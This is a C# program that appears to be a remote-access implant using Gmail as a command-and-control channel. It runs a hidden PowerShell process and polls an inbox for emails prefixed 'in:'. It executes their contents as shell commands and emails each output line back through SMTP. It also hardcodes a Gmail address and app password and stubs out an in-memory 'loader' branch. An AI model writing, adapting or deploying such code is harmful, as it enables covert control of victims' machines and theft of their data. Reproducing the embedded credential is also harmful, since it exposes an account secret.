using System;
using System.Net;           // For NetworkCredentials
using System.Net.Mail;      // For mail operation
using System.Reflection;    // For loading .NET assembly in-memory
//using System.IO;            // For streamwriter
using System.Text;          // For string operation
//using System.Text.RegularExpressions; // For regular expression
using System.Diagnostics;   // For process operation
using System.Collections.Generic; // For List usage
//using System.Threading;         // For threading implementation
using EAGetMail;            // For Reading Gmail inboxes
//using System.Management.Automation;
//using System.Management.Automation.Runspaces;

namespace Gmail
{
    class Program
    {
        //public string GetString(string cmd)
        //{
        //    RunspaceConfiguration rc = Runspace.Create();

        //}

        // ============ Command and Control through Gmail =============================

        static string smtpAddress = "smtp.gmail.com";
        static int SendPortNumber = 587;
        static bool enableSSL = true;

        static string imapAddress = "imap.gmail.com";

        static string emailFromAddress = "conducting.experiment@gmail.com"; //Change to Sender Email Address  
        static string password = "gwvkvstrcbergnre";           		//Change to Sender Password  
        static string emailToAddress = "conducting.experiment@gmail.com"; //Change to Receiver Email Address

        static string subject = "Data from Client:";

        public static void SendEmail(string info)
        {
            using (MailMessage mail = new MailMessage())
            {
                mail.From = new System.Net.Mail.MailAddress(emailFromAddress);
                mail.To.Add(emailToAddress);
                mail.Subject = subject;
                mail.Body = info;
                mail.IsBodyHtml = true;

                using (SmtpClient smtp = new SmtpClient(smtpAddress, SendPortNumber))
                {
                    smtp.Credentials = new NetworkCredential(emailFromAddress, password);
                    smtp.EnableSsl = enableSSL;
                    smtp.Send(mail);
                }
            }
        }

        // Read last Email from a list of all Emails in the Inbox
        public static String[] ReadLastEmail(MailClient oClient, MailServer oServer, List<string> list_emails)
        {
            oClient.Connect(oServer);
            MailInfo[] infos = oClient.GetMailInfos();

            // Only the last (recent/latest) Email
            for (int i = infos.Length - 1; i > infos.Length - 2; i--)
            {
                MailInfo info = infos[i];
                Mail oMail = oClient.GetMail(info);
                //Console.WriteLine("\nSubject: {0}", oMail.Subject);
                //Console.WriteLine(oMail.TextBody);

                list_emails.Add(oMail.TextBody);
                list_emails.Add("\nSubject of Mail Sent by Operator: " + oMail.Subject);
            }

            String[] OrderFromC2 = list_emails.ToArray();
            return OrderFromC2;
        }

        // Read last Email from a list of all unread Emails in the Inbox
        public static String[] ReadLastUnreadEmail(MailClient oClient, MailServer oServer, List<string> list_emails)
        {
            // For reading only Unread Emails
            oClient.GetMailInfosParam.GetMailInfosOptions = GetMailInfosOptionType.NewOnly;

            String[] OrderFromC2 = ReadLastEmail(oClient, oServer, list_emails);
            return OrderFromC2;
        }

        public static String[] ReadEmail()
        {
            List<string> list_all_emails = new List<string>();
            List<string> list_unread_emails = new List<string>();

            MailServer oServer = new MailServer(imapAddress, emailToAddress, password, ServerProtocol.Imap4);

            // Enabling SSL Connection
            oServer.SSLConnection = true;
            oServer.Port = 993;

            MailClient oClient = new MailClient("TryIt");

            String[] Last_OrderFromC2_all_emails = ReadLastEmail(oClient, oServer, list_all_emails);

            // Apply threading...
            //Thread workerThread = new Thread(new ThreadStart(Print));

            /*
            String[] Last_OrderFromC2_unread_emails = ReadLastUnreadEmail(oClient, oServer, list_unread_emails);

            // If last mail from all emails list == last mail from all unread emails list
            // => last mail from all emails list is the the last unread mail.
            if (Last_OrderFromC2_all_emails[0].Equals(Last_OrderFromC2_unread_emails[0]))
            {
                return Last_OrderFromC2_unread_emails;
            }

            String[] New = new string[] {};
            return New;
            */
            return Last_OrderFromC2_all_emails;
        }

        public static void GmailC2Prompt(string command)
        {
            Console.WriteLine("[GmailC2] Command Sent> {0} ", command);
        }

        // Global Variables
        public static string strConcat = "";
        public static int i = 0;

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                Console.WriteLine("{0}. [Each line = one try]", i);

                //Console.WriteLine("strOutput.Append(outLine.Data)");
                strOutput.Append(outLine.Data);

                strConcat += i + "." + strOutput.ToString() + "<br />";

                Console.WriteLine("strConcat: {0}\n", strConcat);
                SendEmail(strConcat);

                i++;

                //catch (Exception err) { }
            }
        }

        static void Main()
        {
            //Console.WriteLine("===============");
            //Console.WriteLine(OrderFromC2.ToLower().Substring(0,2));
            //Console.WriteLine("===============");

            StringBuilder strInput = new StringBuilder();

            Process p = new Process();
            p.StartInfo.FileName = "powershell.exe";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;
            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
            p.Start();

            // Opening prompt
            Console.WriteLine("1. p.StandardInput.WriteLine(strInput) \n");
            p.StandardInput.WriteLine(strInput);

            //Console.ReadLine();

            p.BeginOutputReadLine();

            //Console.ReadLine();

            while (true)
            {
                try
                {
                    string[] OrderFromC2 = ReadEmail();
                    string body = (OrderFromC2[0].ToLower()).Trim();

                    GmailC2Prompt(body);

                    // Chopping the indicator string out from cmd
                    string indicator = body.Substring(0, 3);
                    // Removing Indicator string from input cmd
                    string cmd = body.Substring(3, (body.Length - 3));



                    Console.WriteLine("\n==============================");
                    Console.WriteLine("Body: \n{0}\n", body);
                    Console.WriteLine("==============================\n");

                    //Console.WriteLine("indicator: {0}", indicator);

                    if (indicator.Equals("in:"))
                    {
                        if ((cmd.Substring(0,6)).Equals("loader"))
                        {
                            //string[] args = new[] { cmd };
                            //for (i = 0; i < args.length; i++)
                            //{
                            //    console.writeline("args: {0}", args[i]);
                            //}

                            //console.readline();

                            //worker.loader(args);
                            //console.writeline("append loader part...");
                        }
                        else
                        {
                            strInput.Append(cmd);

                            //Console.WriteLine("In ...");
                            //Console.WriteLine("strConcat: {0}", strConcat);
                            //SendEmail(strConcat);

                            Console.WriteLine("2. p.StandardInput.WriteLine(strInput)");
                            p.StandardInput.WriteLine(strInput);

                            Console.WriteLine("strInput.Remove(0, strInput.Length)");
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                    else if (!(indicator.Equals("in:")))
                    {
                        //Console.WriteLine("indicator: {0}", indicator);
                        //Console.WriteLine("indicator: Not equal to `in:`");
                        //SendEmail("[+] Please add 'in:' before providing commands, like 'in:dir'");

                        // Please Wait for new Email to arrive in inbox then read and respond continue the process...
                    }
                }
                // If the command sent by Operator is less than 3 chars
                catch (ArgumentOutOfRangeException)
                {
                    Console.WriteLine("within catch");
                    SendEmail("[+] Please add 'in:' before providing commands, like 'in:dir'");
                }
            }
        }
    }
}
